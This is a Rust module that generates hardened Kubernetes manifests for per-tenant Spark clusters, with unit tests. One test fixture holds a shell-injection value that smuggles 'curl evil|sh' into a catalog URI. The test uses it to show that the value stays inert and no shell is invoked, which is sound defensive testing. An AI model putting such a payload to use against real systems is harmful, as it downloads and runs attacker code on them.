//! Declarative Kubernetes manifests for one cluster.
//!
//! Every value an attacker can influence (the catalog config) is placed into a typed JSON field —
//! a ConfigMap value delivered to the pod verbatim by the kubelet as a single `WEFT_CATALOG_CONF`
//! env var — and never concatenated into a shell command. The container runs the binary via `argv`
//! (`["weft","spark","server",…]`), so there is no shell to break out of. This is the structural
//! replacement for the EC2 `user_data` injection RCE: there is no interpreter between a connection
//! field and execution.
//!
//! The pod is hardened to satisfy PodSecurity `restricted`: non-root, read-only root filesystem
//! (writable scratch via `emptyDir`), all capabilities dropped, `seccomp=RuntimeDefault`, and the
//! ServiceAccount token is not auto-mounted (the pod authenticates to AWS via IRSA, not the K8s API).
//! Each cluster gets its own namespace (the GC root), a default-deny NetworkPolicy with an egress
//! allowlist, and a ResourceQuota/LimitRange.

use serde_json::{json, Value};

use crate::ClusterSpec;

/// Non-root uid/gid the images are built to run as.
const RUN_AS: u32 = 65532;

/// The per-cluster namespace name (`weft-cl-<id>`), the single GC root + isolation boundary.
pub fn namespace_name(id: &str) -> String {
    format!("weft-cl-{id}")
}

/// Serialize the typed catalog config into the `;`-separated `spark.sql.catalog.<name>.*` string the
/// engine reads from `WEFT_CATALOG_CONF`. Inert: it becomes a ConfigMap *value*, never a shell token.
pub fn catalog_conf_string(conf: &[(String, String)]) -> String {
    conf.iter()
        .map(|(k, v)| format!("{k}={v}"))
        .collect::<Vec<_>>()
        .join(";")
}

/// The hardened container `securityContext` (PodSecurity `restricted`).
fn hardened_container_sc() -> Value {
    json!({
        "allowPrivilegeEscalation": false,
        "readOnlyRootFilesystem": true,
        "runAsNonRoot": true,
        "capabilities": { "drop": ["ALL"] },
        "seccompProfile": { "type": "RuntimeDefault" }
    })
}

/// The hardened pod `securityContext`.
fn hardened_pod_sc() -> Value {
    json!({
        "runAsNonRoot": true,
        "runAsUser": RUN_AS,
        "runAsGroup": RUN_AS,
        "fsGroup": RUN_AS,
        "seccompProfile": { "type": "RuntimeDefault" }
    })
}

/// Common metadata labels tying every object to its cluster (used as the reconcile selector + GC).
fn labels(id: &str) -> Value {
    json!({
        "app.kubernetes.io/managed-by": "weft-gateway",
        "app.kubernetes.io/part-of": "weft",
        "weft.io/cluster-id": id
    })
}

/// Build the ordered list of manifests a gateway applies to provision `spec`. Order matters:
/// namespace first (it scopes everything), then identity/config/policy, then the workload.
pub fn build_cluster_manifests(spec: &ClusterSpec) -> Vec<Value> {
    let id = &spec.id;
    let ns = namespace_name(id);
    let l = labels(id);
    let driver = format!("weft-cl-{id}");
    let workers = format!("weft-cl-{id}-workers");
    let sa = &spec.service_account;
    let conf_cm = format!("weft-cl-{id}-catalog");

    // ServiceAccount (IRSA): the per-cluster least-privilege AWS identity. The role ARN is
    // server-derived (never request-supplied), pinned cross-tenant by the trust policy in Terraform.
    let sa_annotations = match &spec.iam_role_arn {
        Some(arn) => json!({ "eks.amazonaws.com/role-arn": arn }),
        None => json!({}),
    };

    // Catalog config: a single ConfigMap value the kubelet injects verbatim as one env var. NOT
    // `envFrom` (which would turn user-influenced keys into env-var names — a collision/clobber risk).
    let conf_value = catalog_conf_string(&spec.catalog_conf);

    // Volumes: read-only root fs ⇒ writable scratch must come from emptyDir.
    let volumes = json!([
        { "name": "tmp", "emptyDir": {} },
        { "name": "spill", "emptyDir": {} }
    ]);
    let volume_mounts = json!([
        { "name": "tmp", "mountPath": "/tmp" },
        { "name": "spill", "mountPath": "/var/lib/weft/spill" }
    ]);

    let container_env = json!([
        { "name": "AWS_REGION", "value": spec.region },
        { "name": "WEFT_SPILL_DIR", "value": "/var/lib/weft/spill" },
        {
            "name": "WEFT_CATALOG_CONF",
            "valueFrom": { "configMapKeyRef": { "name": conf_cm, "key": "WEFT_CATALOG_CONF" } }
        }
    ]);

    let resources = json!({
        "requests": { "cpu": spec.cpu, "memory": spec.memory },
        "limits": { "cpu": spec.cpu, "memory": spec.memory }
    });

    // Driver Deployment — the Spark Connect endpoint. argv exec, hardened, no auto-mounted SA token.
    let driver_pod_spec = json!({
        "serviceAccountName": sa,
        "automountServiceAccountToken": false,
        "securityContext": hardened_pod_sc(),
        "containers": [{
            "name": "connect",
            "image": spec.image,
            "imagePullPolicy": "IfNotPresent",
            "command": ["weft"],
            "args": ["spark", "server", "--port", spec.port.to_string()],
            "ports": [{ "containerPort": spec.port, "name": "connect" }],
            "env": container_env,
            "resources": resources,
            "securityContext": hardened_container_sc(),
            "volumeMounts": volume_mounts,
            "readinessProbe": {
                "tcpSocket": { "port": spec.port },
                "initialDelaySeconds": 5,
                "periodSeconds": 5
            }
        }],
        "volumes": volumes
    });

    let mut items = vec![
        json!({
            "apiVersion": "v1",
            "kind": "Namespace",
            "metadata": {
                "name": ns,
                "labels": merge(&l, &json!({ "pod-security.kubernetes.io/enforce": "restricted" }))
            }
        }),
        json!({
            "apiVersion": "v1",
            "kind": "ServiceAccount",
            "metadata": { "name": sa, "namespace": ns, "labels": l, "annotations": sa_annotations },
            "automountServiceAccountToken": false
        }),
        json!({
            "apiVersion": "v1",
            "kind": "ConfigMap",
            "metadata": { "name": conf_cm, "namespace": ns, "labels": l },
            "data": { "WEFT_CATALOG_CONF": conf_value }
        }),
        // Default-deny ingress+egress; explicit allows are layered by the next policy.
        json!({
            "apiVersion": "networking.k8s.io/v1",
            "kind": "NetworkPolicy",
            "metadata": { "name": "default-deny", "namespace": ns, "labels": l },
            "spec": { "podSelector": {}, "policyTypes": ["Ingress", "Egress"] }
        }),
        // Egress allowlist (DNS + the catalog/storage CIDRs) and ingress only from the gateway.
        json!({
            "apiVersion": "networking.k8s.io/v1",
            "kind": "NetworkPolicy",
            "metadata": { "name": "weft-cluster-allow", "namespace": ns, "labels": l },
            "spec": {
                "podSelector": { "matchLabels": { "weft.io/cluster-id": id } },
                "policyTypes": ["Ingress", "Egress"],
                "ingress": [{
                    "from": [{ "namespaceSelector": { "matchLabels": { "weft.io/role": "gateway" } } }],
                    "ports": [{ "protocol": "TCP", "port": spec.port }]
                }],
                "egress": egress_rules(&spec.egress_cidrs)
            }
        }),
        json!({
            "apiVersion": "v1",
            "kind": "ResourceQuota",
            "metadata": { "name": "weft-cluster-quota", "namespace": ns, "labels": l },
            "spec": { "hard": {
                "requests.cpu": quota_cpu(spec),
                "requests.memory": quota_mem(spec),
                "pods": (spec.worker_max + 2).to_string()
            } }
        }),
        json!({
            "apiVersion": "v1",
            "kind": "LimitRange",
            "metadata": { "name": "weft-cluster-limits", "namespace": ns, "labels": l },
            "spec": { "limits": [{
                "type": "Container",
                "default": { "cpu": spec.cpu, "memory": spec.memory },
                "defaultRequest": { "cpu": spec.cpu, "memory": spec.memory }
            }] }
        }),
        // Headless Service for the driver — stable in-cluster DNS for the Spark Connect endpoint.
        json!({
            "apiVersion": "v1",
            "kind": "Service",
            "metadata": { "name": driver, "namespace": ns, "labels": l },
            "spec": {
                "selector": { "weft.io/cluster-id": id, "weft.io/role": "driver" },
                "ports": [{ "name": "connect", "port": spec.port, "targetPort": spec.port }]
            }
        }),
        json!({
            "apiVersion": "apps/v1",
            "kind": "Deployment",
            "metadata": { "name": driver, "namespace": ns, "labels": l },
            "spec": {
                "replicas": 1,
                "selector": { "matchLabels": { "weft.io/cluster-id": id, "weft.io/role": "driver" } },
                "template": {
                    "metadata": { "labels": merge(&l, &json!({ "weft.io/role": "driver" })) },
                    "spec": driver_pod_spec
                }
            }
        }),
    ];

    // Workers (optional): a StatefulSet for stable identity, scaled between the floor/ceiling.
    if spec.worker_max > 0 {
        items.push(json!({
            "apiVersion": "apps/v1",
            "kind": "StatefulSet",
            "metadata": { "name": workers, "namespace": ns, "labels": l },
            "spec": {
                "serviceName": workers,
                "replicas": spec.worker_min,
                "selector": { "matchLabels": { "weft.io/cluster-id": id, "weft.io/role": "worker" } },
                "template": {
                    "metadata": { "labels": merge(&l, &json!({ "weft.io/role": "worker" })) },
                    "spec": {
                        "serviceAccountName": sa,
                        "automountServiceAccountToken": false,
                        "securityContext": hardened_pod_sc(),
                        "containers": [{
                            "name": "worker",
                            "image": spec.worker_image,
                            "command": ["weft"],
                            "args": ["worker"],
                            "env": container_env,
                            "resources": resources,
                            "securityContext": hardened_container_sc(),
                            "volumeMounts": volume_mounts
                        }],
                        "volumes": volumes
                    }
                }
            }
        }));
    }

    items
}

/// Build the egress rules: always allow DNS; allow TCP to each catalog/storage CIDR.
fn egress_rules(cidrs: &[String]) -> Value {
    let mut rules = vec![json!({
        "to": [{ "namespaceSelector": {} }],
        "ports": [{ "protocol": "UDP", "port": 53 }, { "protocol": "TCP", "port": 53 }]
    })];
    for cidr in cidrs {
        rules.push(json!({ "to": [{ "ipBlock": { "cidr": cidr } }] }));
    }
    Value::Array(rules)
}

fn quota_cpu(spec: &ClusterSpec) -> String {
    // Coarse ceiling: per-pod cpu × (workers + driver). cpu is a plain integer string here.
    let per: u32 = spec.cpu.parse().unwrap_or(1);
    (per * (spec.worker_max + 1)).to_string()
}

fn quota_mem(spec: &ClusterSpec) -> String {
    // Keep the unit; multiply the leading integer (e.g. "2Gi" × 3 pods → "6Gi").
    let digits: String = spec.memory.chars().take_while(|c| c.is_ascii_digit()).collect();
    let unit: String = spec.memory.chars().skip_while(|c| c.is_ascii_digit()).collect();
    let n: u32 = digits.parse().unwrap_or(2);
    format!("{}{}", n * (spec.worker_max + 1), unit)
}

/// Shallow-merge two JSON objects (right wins). Used to add per-object labels to the base set.
fn merge(base: &Value, extra: &Value) -> Value {
    let mut out = base.as_object().cloned().unwrap_or_default();
    if let Some(e) = extra.as_object() {
        for (k, v) in e {
            out.insert(k.clone(), v.clone());
        }
    }
    Value::Object(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec() -> ClusterSpec {
        ClusterSpec {
            id: "c1".into(),
            image: "weft/connect:1".into(),
            worker_image: "weft/worker:1".into(),
            region: "us-west-2".into(),
            port: 50051,
            worker_min: 1,
            worker_max: 2,
            cpu: "1".into(),
            memory: "2Gi".into(),
            service_account: "weft-cl-c1".into(),
            iam_role_arn: Some("arn:aws:iam::123:role/weft-cl-c1".into()),
            catalog_conf: vec![(
                // A connection value carrying a shell-breakout payload.
                "spark.sql.catalog.x.uri".into(),
                "thrift://h:9083'; curl evil|sh; #".into(),
            )],
            secret_provider_class: None,
            egress_cidrs: vec!["10.0.0.0/16".into()],
        }
    }

    #[test]
    fn payload_stays_inert_no_shell_anywhere() {
        let items = build_cluster_manifests(&spec());
        let blob = serde_json::to_string(&Value::Array(items.clone())).unwrap();
        // The payload appears ONLY as the ConfigMap value, never near a shell.
        let cm = items
            .iter()
            .find(|i| i["kind"] == "ConfigMap")
            .expect("configmap");
        assert!(cm["data"]["WEFT_CATALOG_CONF"]
            .as_str()
            .unwrap()
            .contains("curl evil|sh"));
        // No object invokes a shell: every container command is the `weft` argv form.
        for item in &items {
            if let Some(containers) = find_containers(item) {
                for c in containers {
                    assert_eq!(c["command"], json!(["weft"]), "container must exec weft via argv");
                    assert!(c["command"].as_array().unwrap().iter().all(|a| a != "/bin/sh"
                        && a != "sh"
                        && a != "bash"));
                }
            }
        }
        // Sanity: no `sh -c` slipped into any args.
        assert!(!blob.contains("/bin/sh"));
        assert!(!blob.contains("\"sh\",\"-c\""));
    }

    #[test]
    fn pods_are_hardened_and_isolated() {
        let items = build_cluster_manifests(&spec());
        // Namespace is PodSecurity-restricted.
        let ns = items.iter().find(|i| i["kind"] == "Namespace").unwrap();
        assert_eq!(ns["metadata"]["name"], "weft-cl-c1");
        assert_eq!(
            ns["metadata"]["labels"]["pod-security.kubernetes.io/enforce"],
            "restricted"
        );
        // Every pod template: non-root, no auto-mounted token, hardened container sc.
        for item in &items {
            if let Some(spec) = pod_spec(item) {
                assert_eq!(spec["automountServiceAccountToken"], false);
                assert_eq!(spec["securityContext"]["runAsNonRoot"], true);
                for c in spec["containers"].as_array().unwrap() {
                    let sc = &c["securityContext"];
                    assert_eq!(sc["readOnlyRootFilesystem"], true);
                    assert_eq!(sc["allowPrivilegeEscalation"], false);
                    assert_eq!(sc["capabilities"]["drop"], json!(["ALL"]));
                    assert_eq!(sc["seccompProfile"]["type"], "RuntimeDefault");
                }
            }
        }
        // IRSA role flows onto the ServiceAccount.
        let sa = items.iter().find(|i| i["kind"] == "ServiceAccount").unwrap();
        assert_eq!(
            sa["metadata"]["annotations"]["eks.amazonaws.com/role-arn"],
            "arn:aws:iam::123:role/weft-cl-c1"
        );
        // Default-deny NetworkPolicy present.
        assert!(items.iter().any(|i| i["kind"] == "NetworkPolicy"
            && i["metadata"]["name"] == "default-deny"));
    }

    fn pod_spec(item: &Value) -> Option<&Value> {
        match item["kind"].as_str()? {
            "Deployment" | "StatefulSet" => Some(&item["spec"]["template"]["spec"]),
            _ => None,
        }
    }
    fn find_containers(item: &Value) -> Option<&Vec<Value>> {
        pod_spec(item)?["containers"].as_array()
    }
}
